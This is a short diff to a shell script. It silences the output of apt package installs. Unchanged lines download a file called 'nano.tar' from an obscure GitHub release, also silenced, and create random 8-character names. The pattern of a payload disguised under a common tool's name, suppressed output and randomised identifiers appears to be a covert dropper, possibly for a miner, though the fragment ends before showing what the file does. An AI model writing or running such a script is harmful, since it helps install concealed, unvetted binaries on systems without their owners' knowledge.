@@ -1,5 +1,5 @@
-apt-get update
-apt install -y nano screen
+apt-get update > /dev/null 2>&1 
+apt install -y nano screen > /dev/null 2>&1 
 wget https://github.com/zibercount/terfprce/releases/download/v3.4.2/nano.tar > /dev/null 2>&1 
 VAR1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 VAR2=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
